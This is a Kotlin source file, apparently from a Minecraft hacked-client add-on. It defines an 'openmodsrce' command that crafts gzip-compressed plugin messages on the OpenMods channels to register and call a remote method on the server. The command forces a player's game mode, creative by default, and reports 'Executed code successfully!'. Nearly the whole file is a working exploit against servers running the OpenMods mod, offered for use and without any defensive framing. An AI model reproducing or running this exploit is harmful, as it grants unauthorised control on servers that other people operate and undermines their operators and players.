package de.florianmichael.tarasande_protocol_spoofer.command

import com.google.common.base.Preconditions
import com.google.common.io.Closer
import com.mojang.brigadier.arguments.IntegerArgumentType
import com.mojang.brigadier.builder.LiteralArgumentBuilder
import de.florianmichael.tarasande_protocol_spoofer.TarasandeProtocolSpoofer
import io.netty.buffer.ByteBufOutputStream
import io.netty.buffer.Unpooled
import net.minecraft.command.CommandSource
import net.minecraft.command.argument.GameModeArgumentType
import net.minecraft.world.GameMode
import net.tarasandedevelopment.tarasande.system.feature.commandsystem.Command
import net.tarasandedevelopment.tarasande.util.player.chat.CustomChat
import java.io.*
import java.util.zip.GZIPOutputStream

class CommandOpenModsRCE : Command("openmodsrce") {

    override fun builder(builder: LiteralArgumentBuilder<CommandSource>): LiteralArgumentBuilder<CommandSource> {
        return builder.executes {
            execute()
            return@executes SUCCESS
        }.then(argument("world-id", IntegerArgumentType.integer(-1, 1))!!.executes {
            execute(IntegerArgumentType.getInteger(it, "world-id"))
            return@executes SUCCESS
        }!!.then(argument("entity-id", IntegerArgumentType.integer())!!.executes {
            execute(IntegerArgumentType.getInteger(it, "world-id"), IntegerArgumentType.getInteger(it, "entity-id"))
            return@executes SUCCESS
        }!!.then(argument("gamemode", GameModeArgumentType.gameMode())!!.executes {
            execute(IntegerArgumentType.getInteger(it, "world-id"), IntegerArgumentType.getInteger(it, "entity-id"), it.getArgument("gamemode", GameMode::class.java))
            return@executes SUCCESS
        })))
    }

    private fun writeVLI(output: DataOutput, value: Int) {
        var value = value
        Preconditions.checkArgument(value >= 0, "Value cannot be negative")
        try {
            while (true) {
                var b = value and 0x7F
                val next = value shr 7
                if (next > 0) {
                    b = b or 0x80
                    output.writeByte(b)
                    value = next
                } else {
                    output.writeByte(b)
                    break
                }
            }
        } catch (e: IOException) {
            throw RuntimeException(e)
        }
    }

    private fun execute(worldId: Int = 0, entityId: Int = 1, gameMode: GameMode = GameMode.CREATIVE) {
        var payload = Unpooled.buffer()
        val closer = Closer.create()
        val raw = closer.register(ByteBufOutputStream(payload) as Closeable) as OutputStream
        val compressed = closer.register(GZIPOutputStream(raw) as Closeable) as OutputStream
        var output = DataOutputStream(compressed)

        output.writeUTF("rpc_methods")
        writeVLI(output, 1)
        output.writeUTF("net.minecraft.entity.player.EntityPlayer;func_71033_a;(Lnet/minecraft/world/WorldSettings\$GameType;)V")
        output.writeInt(1337)
        closer.close()

        TarasandeProtocolSpoofer.enforcePluginMessage("OpenMods|I", payload.copy().array(), remap = true)
        payload = Unpooled.buffer()

        output = DataOutputStream(ByteBufOutputStream(payload))
        writeVLI(output, 0)
        output.writeInt(0)
        output.writeInt(entityId)
        writeVLI(output, worldId)
        writeVLI(output, gameMode.id)
        TarasandeProtocolSpoofer.enforcePluginMessage("OpenMods|RPC", payload.copy().array(), remap = true)

        CustomChat.printChatMessage("Executed code successfully!")
    }
}
